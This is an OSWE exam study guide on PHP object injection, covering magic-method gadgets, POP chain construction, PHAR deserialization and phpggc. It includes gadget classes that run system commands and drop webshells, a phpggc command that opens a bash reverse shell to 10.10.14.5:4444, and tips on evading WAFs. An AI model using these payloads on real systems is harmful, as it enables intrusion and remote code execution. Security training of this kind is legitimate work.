# PHP Deserialization Patterns Guide

**Target Audience**: OSWE candidates focusing on white-box PHP audits and PoC development.
**Time to reasonable proficiency**: 6-10 hours of targeted labs + code review.

---

## Overview

PHP object injection occurs when `unserialize()` is called on attacker-controlled data. Because PHP reconstructs live objects and automatically invokes "magic methods" during object lifecycle, attackers can chain properties across classes (Property-Oriented Programming / POP chains) to reach dangerous primitives such as `system()`, file writes, or SQL execution.

This guide complements:
- `notes/PHP-OBJECT-INJECTION.md` (concise case study)
- `poc-examples/php-object-injection/` (full working PoC + 349-line lab manual)
- `poc-examples/atutor-type-juggling/` (real chaining example that often appears with PHP issues)

---

## Part 1: PHP Magic Methods (The Gadgets)

### Core Dangerous Methods

```php
__wakeup()      // During unserialize()
__sleep()       // Before serialize() (less useful for attacker)
__destruct()    // When object goes out of scope / script end
__toString()    // Object used in string context (echo, concat, file paths, SQL)
__invoke()      // Object called as function
__call()        // Inaccessible method called
__get() / __set() / __isset() / __unset()
__construct()   // Sometimes useful if properties set before
```

### Typical Gadget Examples

**File operations via __destruct**:
```php
class FileDeleter {
    public $file;
    function __destruct() {
        unlink($this->file);
    }
}
```

**Command execution via __toString or __destruct**:
```php
class Command {
    public $cmd;
    function __toString() {
        return system($this->cmd);   // or passthru, exec, shell_exec, popen, proc_open
    }
}
```

**File write / webshell drop**:
```php
class WebshellDropper {
    public $filename;
    public $data;
    function __destruct() {
        file_put_contents($this->filename, $this->data);
    }
}
```

**Include / LFI escalation**:
```php
class TemplateLoader {
    public $template;
    function __toString() {
        return file_get_contents($this->template); // or include
    }
}
```

See the detailed vulnerable class catalog in `poc-examples/php-object-injection/Notes.md`.

---

## Part 2: Finding Injection Points (Code Review)

High-yield searches (case-insensitive where possible):

```bash
grep -r "unserialize" --include="*.php" .
grep -r "base64_decode.*unserialize\|unserialize.*base64_decode" .
grep -r "\$_COOKIE\|\$_POST\|\$_GET\|\$_REQUEST" . | grep -i unserialize
grep -r "session_decode\|session_start" .   # sometimes wraps unserialize
grep -r "phar://" --include="*.php" .
```

Also look for:
- Custom session handlers (`SessionHandlerInterface`)
- Cache layers that store serialized objects
- "Profile" or "preferences" blobs stored in DB and later unserialized
- Import/export features that accept serialized PHP

**In real apps** the call is often not obvious `unserialize($_COOKIE['x'])` — it may be buried in a framework base class, a "safe" wrapper, or triggered only on certain user types.

---

## Part 3: POP Chain Construction Methodology

1. **Inventory all classes** with magic methods in the loaded scope (or autoloadable).
2. **Map properties** that flow into dangerous functions (system, file_*, include, SQL concat, eval, etc.).
3. **Start from the injection point** (the object you control directly via unserialize).
4. **Walk the graph**: Set a property on object A to an instance of object B so that when A's magic fires it passes attacker data into B's magic.
5. **Test incrementally** — serialize small chains and observe side effects (file created, command run with known marker).
6. **Minimize** the chain for reliability and size.

**Paper exercise first** (highly recommended for exam speed):
```
Evil::__destruct()
  → $this->logFile = new Template()
Template::__toString()
  → return system($this->cmd)
```

Then code the minimal PHP snippet that builds exactly that object graph and serializes it.

---

## Part 4: PHAR Deserialization (The "No unserialize() Needed" Vector)

Even when you cannot reach `unserialize()` directly, many apps perform file operations on user-controlled paths (uploads, imports, "download from URL" that saves locally, etc.).

If any of these run on a path you control:

```php
file_get_contents($path);
file_exists($path);
include($path);
fopen($path, 'r');
...
```

You can upload (or cause the app to fetch) a specially crafted `.phar` archive whose **metadata** contains a serialized POP object. Accessing it via the `phar://` wrapper triggers unserialize of the metadata.

**Creation pattern** (see phpggc `-p phar` too):
```php
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->addFromString('dummy.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(new YourGadgetObject());
$phar->stopBuffering();
```

Then force the app to resolve `phar://uploads/evil.phar/dummy.txt` (often via path traversal in the filename or by controlling an "include" parameter after upload).

This is extremely powerful on real PHP apps and appears in many bug bounty / CTF reports.

---

## Part 5: Common Real-World POP Chains (When Popular Libs Are Present)

Use **phpggc** first — it has battle-tested chains for:

- Monolog (very common)
- Symfony (PropertyAccess, etc.)
- SwiftMailer
- Guzzle
- WordPress (many core classes)
- Laravel (some versions)
- Doctrine, etc.

```bash
./phpggc -l | grep -i monolog
./phpggc Monolog/RCE1 system 'bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"'
./phpggc -p phar -o shell.phar Monolog/RCE1 system 'id'
```

When the exact chain doesn't exist or you are on a custom app, you build your own from the classes present (the skill OSWE rewards).

See `poc-examples/php-object-injection/Notes.md` for manual chain construction walkthroughs.

---

## Part 6: Code Review Checklist (OSWE Style)

- [ ] Every `unserialize(` (with and without `allowed_classes`)
- [ ] All classes containing `__destruct`, `__wakeup`, `__toString`, `__call`, `__invoke`
- [ ] Any file operation, `system`/`exec`/shell family, `include`/`require`, `eval`, SQL concat inside magic methods
- [ ] Autoloader behavior (which classes can be pulled in at unserialize time?)
- [ ] PHAR usage or any `phar://` in the codebase
- [ ] User-controlled values reaching the above (cookies, POST, files, DB fields later read, etc.)
- [ ] Framework version + known phpggc chains for that stack

**30-minute first pass** (exam time box):
Grep the dangerous functions + "unserialize" + "phar". Open the files containing magic methods. Sketch the 2-3 most promising chains on paper. Pick the shortest one that gives you RCE or file write.

---

## Part 7: PoC Development with the Repo Skeleton

The `poc-examples/php-object-injection/poc.py` follows the standard ExploitContext + stage pattern used by all examples in this repo.

Key things the PoC demonstrates:
- Recon stage that checks reachability and looks for PHP indicators.
- Payload generation stage (you will customize `generate_pop_chain` for the specific classes in your target).
- Multiple delivery methods (cookie, POST, GET) — common in real vulns.
- Note in the code: "Real exploitation requires application-specific POP chains".

**Recommended workflow**:
1. Use the case study + this guide to identify the exact classes and properties.
2. Build + test the serialized object locally in a minimal PHP file.
3. Drop the working `serialize(...)` string (or base64) into your PoC's generation function.
4. Add verification (callback, file existence check via another request, etc.).
5. Integrate with `modules/payloads.php_webshell_*` or reverse shell helpers if you want to drop a persistent shell.

See also `Building a Reusable OSWE PoC Skeleton.md` and the advanced-skeleton for reusable reverse shell / webshell generators.

---

## Part 8: Exam Strategy & Common Pitfalls

- **Time**: 30-45 min is realistic for a full PHP object injection chain once you're practiced (15 min review + 10 min chain design + 5 min payload + 5-10 min PoC glue + verify).
- **Pitfall 1**: Classes not loaded. You may need to find an entry point that causes the right files to be `require`d before your unserialize.
- **Pitfall 2**: Property visibility. Use `public` in your gadget classes for the PoC unless the real chain uses protected/private (phpggc handles serialization of those).
- **Pitfall 3**: Magic quotes / encoding. Cookies and some params may need base64 + urlencode layers.
- **Pitfall 4**: WAFs that block `system(` etc. Use obfuscation (`\x73ystem`, variable variables, `assert`, `call_user_func`, etc.) or write a file and include it.
- **Chaining value**: PHP object injection often gives you immediate RCE as the web user — use it to read source or configs for the *next* vuln on the same host.

---

## Part 9: Additional Practice

- ATutor 2.2.1 type juggling + auth RCE (combo of type juggling + file upload, sometimes with deserial elements) — see notes/ and poc/.
- Real phpggc targets: install old versions of Monolog/Symfony/WordPress and generate + trigger.
- bmdyy and other student-made OSWE-like PHP labs.
- PortSwigger and PentesterLab PHP object injection exercises (script them).

---

## References

- OWASP PHP Object Injection: https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection
- PHPGGC (essential): https://github.com/ambionics/phpggc
- Checkpoint PHAR deep dive: https://blog.checkpoint.com/2019/02/13/phar-deserialization-vulnerabilities-in-php/
- `poc-examples/php-object-injection/Notes.md` (rich lab manual)
- `notes/PHP-OBJECT-INJECTION.md` (case study)
- Related: `notes/ATUTOR-2.2.1-*` for full exploitation chains involving PHP issues

Keep this guide + the PoC examples + your own paper chain sketches as your personal PHP deserial "cheat sheet" for the exam.
